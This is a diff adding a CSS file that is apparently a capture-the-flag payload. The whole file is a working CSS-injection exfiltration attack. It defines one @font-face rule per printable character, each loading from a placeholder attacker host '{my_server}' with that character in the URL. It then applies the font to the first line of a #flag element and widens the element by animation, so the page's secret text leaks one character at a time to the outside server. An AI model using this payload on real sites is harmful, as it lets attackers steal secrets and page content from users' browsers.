@@ -1,0 +1,115 @@
+@font-face{ font-family:poc; src: url(http://{my_server}/?!); unicode-range:U+0021;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?"); unicode-range:U+0022;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?#); unicode-range:U+0023;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?$); unicode-range:U+0024;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?%); unicode-range:U+0025;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?&); unicode-range:U+0026;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?'); unicode-range:U+0027;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?(); unicode-range:U+0028;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?)); unicode-range:U+0029;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?*); unicode-range:U+002a;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?+); unicode-range:U+002b;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?,); unicode-range:U+002c;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?-); unicode-range:U+002d;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?.); unicode-range:U+002e;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?/); unicode-range:U+002f;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?0); unicode-range:U+0030;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?1); unicode-range:U+0031;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?2); unicode-range:U+0032;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?3); unicode-range:U+0033;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?4); unicode-range:U+0034;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?5); unicode-range:U+0035;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?6); unicode-range:U+0036;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?7); unicode-range:U+0037;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?8); unicode-range:U+0038;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?9); unicode-range:U+0039;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?:); unicode-range:U+003a;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?;); unicode-range:U+003b;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?<); unicode-range:U+003c;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?=); unicode-range:U+003d;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?>); unicode-range:U+003e;}
+@font-face{ font-family:poc; src: url(http://{my_server}/??); unicode-range:U+003f;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?@); unicode-range:U+0040;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?A); unicode-range:U+0041;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?B); unicode-range:U+0042;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?C); unicode-range:U+0043;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?D); unicode-range:U+0044;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?E); unicode-range:U+0045;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?F); unicode-range:U+0046;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?G); unicode-range:U+0047;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?H); unicode-range:U+0048;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?I); unicode-range:U+0049;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?J); unicode-range:U+004a;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?K); unicode-range:U+004b;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?L); unicode-range:U+004c;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?M); unicode-range:U+004d;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?N); unicode-range:U+004e;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?O); unicode-range:U+004f;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?P); unicode-range:U+0050;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?Q); unicode-range:U+0051;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?R); unicode-range:U+0052;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?S); unicode-range:U+0053;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?T); unicode-range:U+0054;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?U); unicode-range:U+0055;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?V); unicode-range:U+0056;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?W); unicode-range:U+0057;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?X); unicode-range:U+0058;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?Y); unicode-range:U+0059;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?Z); unicode-range:U+005a;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?[); unicode-range:U+005b;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?\); unicode-range:U+005c;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?]); unicode-range:U+005d;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?^); unicode-range:U+005e;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?_); unicode-range:U+005f;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?`); unicode-range:U+0060;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?a); unicode-range:U+0061;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?b); unicode-range:U+0062;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?c); unicode-range:U+0063;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?d); unicode-range:U+0064;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?e); unicode-range:U+0065;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?f); unicode-range:U+0066;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?g); unicode-range:U+0067;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?h); unicode-range:U+0068;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?i); unicode-range:U+0069;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?j); unicode-range:U+006a;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?k); unicode-range:U+006b;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?l); unicode-range:U+006c;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?m); unicode-range:U+006d;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?n); unicode-range:U+006e;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?o); unicode-range:U+006f;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?p); unicode-range:U+0070;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?q); unicode-range:U+0071;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?r); unicode-range:U+0072;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?s); unicode-range:U+0073;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?t); unicode-range:U+0074;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?u); unicode-range:U+0075;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?v); unicode-range:U+0076;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?w); unicode-range:U+0077;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?x); unicode-range:U+0078;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?y); unicode-range:U+0079;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?z); unicode-range:U+007a;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?{); unicode-range:U+007b;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?|); unicode-range:U+007c;}
+@font-face{ font-family:poc; src: url(http://{my_server}/?}); unicode-range:U+007d;}
+
+#flag{ 
+    font-family: Courier New, monospace;
+    word-break: break-all;
+    width: 3px;
+    animation: sss 40s linear;
+}
+
+#flag:first-line{
+    font-family: poc, monospace;
+    background: yellow;
+}
+
+
+@keyframes sss {
+  0% {
+    width: 3px;
+  }
+  100%{
+  	width: 800px;
+  }
+}
